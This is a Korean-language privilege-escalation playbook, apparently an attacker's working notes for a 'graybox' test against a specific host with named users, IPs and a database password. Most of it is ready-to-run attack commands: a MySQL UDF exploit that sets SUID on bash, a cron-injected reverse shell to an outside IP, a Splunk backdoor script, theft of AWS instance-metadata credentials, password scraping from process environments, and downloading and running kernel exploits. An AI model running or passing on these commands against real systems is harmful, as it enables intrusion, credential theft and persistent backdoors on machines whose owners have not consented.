# 권한 상승 - 결정적 정보 가이드

## 🎯 "하나만 알면 다 풀리는" 정보들

그레이박스 테스트에서 요청할 수 있는 정보들 (중요도 순):

---

## 1. MySQL root 비밀번호 ⭐⭐⭐⭐⭐

**왜 중요한가:**
- MySQL root 권한으로 어떤 파일이든 읽기/쓰기 가능
- UDF를 통해 즉시 시스템 명령 실행 가능
- /etc/shadow, SSH 키 등 모든 것 접근 가능

**요청 방법:**
```
"MySQL root 계정의 비밀번호를 알려주세요"
또는
"MySQL root 계정이 비밀번호가 있나요? (있다/없다만)"
```

**비밀번호를 얻으면:**
```bash
mysql -u root -p'[비밀번호]' << 'ROOTEOF'
USE mysql;
CREATE TABLE foo(line blob);
INSERT INTO foo VALUES(LOAD_FILE('/tmp/raptor_udf2.so'));
SELECT * FROM foo INTO DUMPFILE '/usr/lib64/mariadb/plugin/raptor_udf2.so';
CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so';
SELECT do_system('chmod u+s /bin/bash');
ROOTEOF

/bin/bash -p
```

**비밀번호가 없으면 (빈 비밀번호):**
```bash
mysql -u root << 'ROOTEOF'
[위와 동일]
ROOTEOF
```

---

## 2. 시스템 사용자 비밀번호 ⭐⭐⭐⭐⭐

**대상:** root, hongjungho, hongjungsu, ec2-user 등

**요청 방법:**
```
"hongjungho 계정의 비밀번호를 알려주세요"
또는
"sudo 비밀번호를 알려주세요"
```

**비밀번호를 얻으면:**
```bash
su - hongjungho
[비밀번호 입력]

# sudo 권한 확인
sudo -l

# Root
sudo su -
```

---

## 3. SSH Private Key 위치 ⭐⭐⭐⭐

**요청 방법:**
```
"root 또는 다른 사용자의 SSH private key가 어디 있나요?"
```

**위치를 알면:**
```bash
# 키 복사
cat /path/to/id_rsa

# 로컬에서 사용
chmod 600 key.pem
ssh -i key.pem root@3.34.181.145
```

---

## 4. Writable Cron 파일 위치 ⭐⭐⭐⭐

**요청 방법:**
```
"apache 사용자가 쓰기 가능한 cron 파일이나 디렉토리가 있나요?"
```

**있으면:**
```bash
# cron job 추가
echo "* * * * * root chmod u+s /bin/bash" >> /path/to/writable/cron
# 또는
echo "* * * * * root bash -c 'bash -i >& /dev/tcp/13.158.67.78/4445 0>&1'" >> /path/to/writable/cron

# 1분 대기
sleep 60
/bin/bash -p
```

---

## 5. SUID 바이너리 정보 ⭐⭐⭐⭐

**요청 방법:**
```
"비표준 SUID 바이너리가 있나요? (특히 커스텀 프로그램)"
```

**있으면:**
```bash
# GTFOBins에서 exploit 검색
https://gtfobins.github.io/

# 또는 직접 악용
/path/to/suid_binary [options]
```

---

## 6. Sudo 규칙 ⭐⭐⭐⭐

**요청 방법:**
```
"apache 사용자의 sudo 권한이 있나요? (sudo -l 출력)"
또는
"/etc/sudoers 파일에 apache 관련 규칙이 있나요?"
```

**있으면:**
```bash
sudo -l
# 출력 보고 GTFOBins에서 exploit 찾기
```

---

## 7. Kernel Exploit 작동 여부 ⭐⭐⭐

**요청 방법:**
```
"CVE-2023-32233 또는 CVE-2021-22555가 이 시스템에서 작동하나요?"
또는
"어떤 kernel exploit이 작동하나요?"
```

**작동하는 exploit을 알면:**
```bash
cd /tmp
wget [exploit URL]
gcc -o exploit exploit.c
./exploit
```

---

## 8. Splunk 실행 권한 ⭐⭐⭐

**요청 방법:**
```
"Splunk가 root 권한으로 실행되나요?"
```

**root로 실행되면:**
```bash
# Splunk app 디렉토리에 백도어
cd /opt/splunk/etc/apps/
mkdir -p myapp/bin
cat > myapp/bin/run.sh << 'EOF'
#!/bin/bash
chmod u+s /bin/bash
EOF
chmod +x myapp/bin/run.sh

# Splunk 재시작 대기 또는 수동 트리거
```

---

## 9. 웹 애플리케이션 취약점 ⭐⭐⭐

**요청 방법:**
```
"phpMyAdmin에 root 계정으로 접근 가능한가요?"
또는
"파일 업로드 기능에 제한이 있나요?"
```

**제한 없으면:**
```bash
# phpMyAdmin으로 MySQL root 접근
# → UDF exploit

# 파일 업로드로 webshell
# → 더 좋은 쉘 또는 SUID exploit 업로드
```

---

## 10. AWS IAM Role 정보 ⭐⭐⭐

**요청 방법:**
```
"EC2 인스턴스에 연결된 IAM role이 있나요?"
또는
"IAM role의 권한이 무엇인가요?"
```

**있으면:**
```bash
# 메타데이터에서 크레덴셜 가져오기
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
ROLE=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE

# AWS CLI 사용
aws sts get-caller-identity
aws ec2 describe-instances
# 권한에 따라 추가 작업
```

---

## 11. 숨겨진 설정 파일 ⭐⭐

**요청 방법:**
```
"비밀번호가 포함된 설정 파일이 어디 있나요?"
또는
"/root 디렉토리에 중요한 파일이 있나요?"
```

**위치를 알면:**
```bash
# MySQL FILE 권한으로 읽기
mysql -u webuser -p'WebPassw0rd!' -e "SELECT LOAD_FILE('/path/to/file');"

# 또는 웹쉘로 읽기 (readable이면)
```

---

## 12. MySQL @@secure_file_priv 설정 ⭐⭐⭐⭐⭐

**요청 방법:**
```
"MySQL의 secure_file_priv 설정값이 무엇인가요?"
```

**이미 확인 가능:**
```bash
mysql -u webuser -p'WebPassw0rd!' -e "SELECT @@secure_file_priv;"
```

**결과 해석:**
- `NULL` → 제한 없음, UDF exploit 가능!
- `/var/lib/mysql-files/` → 해당 디렉토리에만 쓰기 가능
- (빈 문자열) → 제한 없음

---

## 13. 컴파일러 및 도구 ⭐⭐

**요청 방법:**
```
"타겟에 gcc, make, 개발 도구가 설치되어 있나요?"
```

**이미 확인 가능:**
```bash
which gcc
which make
which python3
gcc --version
```

---

## 14. 네트워크 제한 ⭐⭐

**요청 방법:**
```
"타겟에서 외부 인터넷 접근이 가능한가요?"
또는
"어떤 포트가 아웃바운드로 열려있나요?"
```

**이미 부분 확인 가능:**
```bash
ping -c 2 8.8.8.8
wget https://google.com -O /tmp/test.html
```

---

## 🚀 실전 조언

### 그레이박스에서 힌트 요청 전략:

1. **먼저 직접 확인 가능한 것들 모두 시도**
   - MySQL 설정 확인
   - Cron jobs 확인
   - SUID 바이너리 확인
   - 프로세스 메모리 검색

2. **한 가지만 물어본다면:**
   ```
   "MySQL root 비밀번호를 알려주세요"
   ```
   → 거의 100% 권한 상승 성공

3. **두 가지 물어볼 수 있다면:**
   ```
   1. "MySQL root 비밀번호를 알려주세요"
   2. "hongjungho 사용자의 비밀번호를 알려주세요"
   ```

4. **세 가지 물어볼 수 있다면:**
   ```
   1. "MySQL root 비밀번호를 알려주세요"
   2. "시스템 사용자(hongjungho/hongjungsu) 비밀번호를 알려주세요"
   3. "writable cron 파일이나 비표준 SUID 바이너리가 있나요?"
   ```

---

## 📋 현재 상황 체크리스트

확인 가능한 것들 (힌트 요청 전에):

```bash
# MySQL 설정
mysql -u webuser -p'WebPassw0rd!' -e "SELECT @@secure_file_priv; SELECT @@plugin_dir;"

# Cron
cat /etc/crontab
ls -la /etc/cron.d/
find /etc/cron* -writable 2>/dev/null

# SUID
find / -perm -4000 -type f 2>/dev/null | grep -v "^/usr/bin\|^/usr/sbin"

# 프로세스 메모리
for pid in /proc/[0-9]*/environ; do cat "$pid" 2>/dev/null | tr '\0' '\n' | grep -i pass; done | head -20

# Splunk
ps aux | grep splunk | grep root

# 사용자
cat /etc/passwd | grep "/bin/bash"

# sudo
sudo -l 2>&1

# AWS
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

---

## 🎯 최종 전략

### 단계 1: 자동화 스크립트 실행
```bash
bash /tmp/EXECUTE_NOW.sh
```

### 단계 2: 결과 분석
- MySQL UDF 성공? → Root!
- Writable cron 발견? → Root!
- Splunk root 실행? → Root!

### 단계 3: 실패시 힌트 요청
```
"MySQL root 비밀번호를 알려주세요"
```

### 단계 4: 힌트로 권한 상승
```bash
mysql -u root -p'[힌트_비밀번호]' << 'EOF'
[UDF exploit]
EOF
```

---

## 💡 참고사항

이 시스템의 특징:
- ✅ MySQL 접근 가능 (webuser)
- ✅ gcc 설치됨
- ✅ 웹쉘 작동
- ✅ 리버스 쉘 안정적
- ❌ sudo 비밀번호 모름
- ❌ 표준 kernel exploit 실패
- ❌ Docker 없음
- ❌ AWS IAM role 없음 (확인됨)

**가장 유망한 벡터:**
1. MySQL root 접근 (힌트 필요)
2. 시스템 사용자 비밀번호 (힌트 필요)
3. Writable cron (자동 확인 가능)
4. 비표준 SUID (자동 확인 가능)

**핵심:**
- MySQL이 이미 설치되고 webuser 접근 가능
- root 권한 MySQL 접근만 있으면 즉시 시스템 root 획득 가능
- 이것이 "하나만 알면 다 풀리는" 정보!
